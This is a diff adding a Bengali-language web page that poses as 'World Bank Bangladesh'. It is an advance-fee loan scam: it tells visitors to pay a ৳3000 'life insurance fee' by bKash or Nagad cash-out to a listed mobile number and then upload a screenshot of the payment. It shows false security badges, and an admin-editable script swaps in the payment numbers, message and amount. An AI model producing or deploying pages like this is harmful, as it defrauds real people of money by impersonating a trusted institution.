@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>🌐 WORLD BANK BANGLADESH</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:
+linear-gradient(180deg,#eef4ff,#f8fbff);
+overflow-x:hidden;
+}
+
+/* HEADER */
+
+.header{
+
+background:
+linear-gradient(135deg,
+#003ecb,
+#2563eb,
+#0f5eff);
+
+padding:18px 16px;
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+
+color:white;
+
+border-bottom-left-radius:28px;
+border-bottom-right-radius:28px;
+
+box-shadow:
+0 10px 25px rgba(37,99,235,.25);
+
+position:sticky;
+top:0;
+z-index:1000;
+}
+
+.headerLeft{
+display:flex;
+align-items:center;
+gap:12px;
+}
+
+.logo{
+width:52px;
+height:52px;
+
+border-radius:18px;
+
+background:
+linear-gradient(135deg,#ffffff,#dbeafe);
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+font-size:24px;
+}
+
+.title{
+font-size:18px;
+font-weight:900;
+line-height:1.2;
+}
+
+.subTitle{
+font-size:9px;
+margin-top:3px;
+opacity:.92;
+}
+
+.safe{
+font-size:10px;
+font-weight:800;
+
+padding:6px 10px;
+
+border-radius:999px;
+
+background:
+rgba(255,255,255,.15);
+
+border:1px solid rgba(255,255,255,.2);
+}
+
+/* PREMIUM FLASH */
+
+.flashBar{
+width:calc(100% - 20px);
+
+overflow:hidden;
+
+background:
+linear-gradient(
+135deg,
+#0f172a,
+#1e3a8a,
+#2563eb,
+#4f46e5,
+#7c3aed
+);
+
+background-size:300% 300%;
+
+animation:gradientMove 8s ease infinite;
+
+padding:10px 0;
+
+margin:10px;
+
+border-radius:18px;
+
+box-shadow:
+0 8px 20px rgba(79,70,229,.25);
+
+border:1px solid rgba(255,255,255,.12);
+}
+
+.flashText{
+white-space:nowrap;
+
+color:white;
+
+font-size:11px;
+font-weight:800;
+
+letter-spacing:.3px;
+
+animation:
+flashMove 18s linear infinite;
+}
+
+@keyframes gradientMove{
+
+0%{
+background-position:0% 50%;
+}
+
+50%{
+background-position:100% 50%;
+}
+
+100%{
+background-position:0% 50%;
+}
+
+}
+
+@keyframes flashMove{
+
+0%{
+transform:translateX(100%);
+}
+
+100%{
+transform:translateX(-100%);
+}
+
+}
+
+/* MAIN */
+
+.container{
+max-width:520px;
+margin:auto;
+padding:10px;
+}
+
+.card{
+padding:16px;
+border-radius:22px;
+
+background:
+rgba(255,255,255,.98);
+
+box-shadow:
+0 8px 24px rgba(0,0,0,.05);
+
+margin-top:12px;
+}
+
+/* TEMPLATE */
+
+.template{
+font-size:14px;
+line-height:1.8;
+padding:18px;
+
+border-radius:18px;
+
+background:
+linear-gradient(180deg,#f8fbff,#eef5ff);
+
+border:1px solid #dbeafe;
+
+font-weight:700;
+
+color:#16213e;
+
+text-align:center;
+
+display:flex;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+}
+
+/* AGENTS */
+
+.agentBox{
+margin-top:22px;
+}
+
+.agent{
+padding:12px 14px;
+
+border-radius:18px;
+
+margin-bottom:12px;
+
+background:
+linear-gradient(180deg,#ffffff,#f8fbff);
+
+border:1px solid #e5edff;
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.agentLeft{
+display:flex;
+align-items:center;
+gap:8px;
+}
+
+/* REMOVE LOGO */
+
+.payLogo{
+display:none;
+}
+
+/* NAME */
+
+.agentName{
+font-size:14px;
+font-weight:800;
+color:#334155;
+}
+
+/* NUMBER */
+
+.agentNumber{
+font-size:16px;
+font-weight:900;
+color:#001b75;
+letter-spacing:.3px;
+}
+
+/* AMOUNT */
+
+.amountBox{
+max-width:180px;
+
+margin:20px auto;
+
+padding:12px;
+
+border-radius:16px;
+
+background:
+linear-gradient(180deg,#f7fbff,#edf4ff);
+
+border:1px solid #cfe0ff;
+
+font-size:28px;
+font-weight:900;
+
+text-align:center;
+
+color:#0057ff;
+}
+
+/* UPLOAD */
+
+.uploadTitle{
+font-size:15px;
+font-weight:800;
+
+text-align:center;
+
+margin-top:8px;
+
+color:#16213e;
+}
+
+.uploadBox{
+width:160px;
+height:160px;
+
+margin:18px auto;
+
+background:
+linear-gradient(180deg,#ffffff,#f5f9ff);
+
+border:2px dashed #3b82f6;
+
+border-radius:22px;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+cursor:pointer;
+}
+
+.cloud{
+font-size:52px;
+text-align:center;
+}
+
+.uploadText{
+font-size:13px;
+font-weight:700;
+
+margin-top:8px;
+
+text-align:center;
+
+color:#1d4ed8;
+}
+
+#preview{
+width:100%;
+margin-top:14px;
+border-radius:16px;
+display:none;
+}
+
+/* BUTTON */
+
+.submitBtn{
+width:100%;
+
+padding:13px;
+
+background:
+linear-gradient(135deg,#0047d4,#2563eb,#0f5eff);
+
+color:white;
+
+font-size:18px;
+font-weight:900;
+
+border:none;
+border-radius:16px;
+
+margin-top:16px;
+
+cursor:pointer;
+
+box-shadow:
+0 8px 18px rgba(37,99,235,.22);
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+.header{
+flex-direction:row;
+}
+
+.agent{
+flex-direction:row;
+align-items:center;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+
+<div class="header">
+
+<div class="headerLeft">
+
+<div class="logo">
+🌍
+</div>
+
+<div>
+
+<div class="title">
+🌐 WORLD BANK BANGLADESH
+</div>
+
+<div class="subTitle">
+  🌐বিশ্বব্যাংকের সহায়তায় উন্নত বাংলাদেশ গড়ি
+</div>
+
+</div>
+
+</div>
+
+<div class="safe">
+🛡 Secure
+</div>
+
+</div>
+
+<!-- FLASH -->
+
+<div class="flashBar">
+
+<div class="flashText">
+
+🌍✔ Secure Verification  
+⏰✔ First Application Verified  
+🌏✔ 100% Transaction Safe 💯 
+🌐 World Bank Bangladesh এ আপনাকে স্বাগতম
+
+</div>
+
+</div>
+
+<!-- MAIN -->
+
+<div class="container">
+
+<div class="card">
+
+<!-- TEMPLATE -->
+
+<div class="template" id="templateText">
+
+বিশ্বব্যাংক-বাংলাদেশ থেকে ঋণ পেতে আপনার একটি সক্রিয় জীবন বীমা থাকতে হবে। যেহেতু আপনার নামে কোনো সক্রিয় জীবন বীমা নেই তাই ব্যাংক আপনার পক্ষে এটি তৈরি করবে যা অনুমোদন করার জন্য আপনাকে জীবন বীমার ফি প্রদান করতে হবে। জীবন বীমার টাকা আপনার কিস্তি পরিশোধ হলে ফেরত দেওয়া হবে। নিচের দেওয়া নাম্বারে জীবন বীমা ফি প্রদান করতে ক্যাশ-আউট করুন।
+
+</div>
+
+<!-- AGENTS -->
+
+<div class="agentBox">
+
+<!-- BKASH -->
+
+<div class="agent">
+
+<div class="agentLeft">
+
+<div class="agentName">
+বিকাশ এজেন্ট
+</div>
+
+</div>
+
+<div class="agentNumber" id="bkashNumber">
+01775188863
+</div>
+
+</div>
+
+<!-- NAGAD -->
+
+<div class="agent">
+
+<div class="agentLeft">
+
+<div class="agentName">
+নগদ এজেন্ট
+</div>
+
+</div>
+
+<div class="agentNumber" id="nagadNumber">
+01775188863
+</div>
+
+</div>
+
+</div>
+
+<!-- AMOUNT -->
+
+<div class="amountBox" id="amountText">
+৳৩০০০
+</div>
+
+<!-- UPLOAD -->
+
+<div class="uploadTitle">
+সকল ফি ট্রান্সফারের স্ক্রিনশট জমা করুন
+</div>
+
+<label class="uploadBox" for="uploadFile">
+
+<div>
+
+<div class="cloud">
+☁
+</div>
+
+<div class="uploadText">
+স্ক্রিনশট আপলোড করুন
+</div>
+
+</div>
+
+</label>
+
+<input type="file"
+id="uploadFile"
+accept="image/*"
+style="display:none"
+onchange="previewImage(event)">
+
+<img id="preview">
+
+<button class="submitBtn">
+জমা দিন
+</button>
+
+</div>
+
+</div>
+
+<script>
+
+/* IMAGE PREVIEW */
+
+function previewImage(event){
+
+const file = event.target.files[0];
+
+if(file){
+
+const reader = new FileReader();
+
+reader.onload = function(){
+
+const img =
+document.getElementById("preview");
+
+img.src = reader.result;
+
+img.style.display = "block";
+
+}
+
+reader.readAsDataURL(file);
+
+}
+
+}
+
+/* ADMIN DATA LOAD */
+
+function loadData(){
+
+if(localStorage.getItem("template")){
+
+document.getElementById("templateText")
+.innerText =
+localStorage.getItem("template");
+
+}
+
+if(localStorage.getItem("bkash")){
+
+document.getElementById("bkashNumber")
+.innerText =
+localStorage.getItem("bkash");
+
+}
+
+if(localStorage.getItem("nagad")){
+
+document.getElementById("nagadNumber")
+.innerText =
+localStorage.getItem("nagad");
+
+}
+
+if(localStorage.getItem("amount")){
+
+document.getElementById("amountText")
+.innerText =
+localStorage.getItem("amount");
+
+}
+
+}
+
+loadData();
+
+</script>
+
+</body>
+</html>
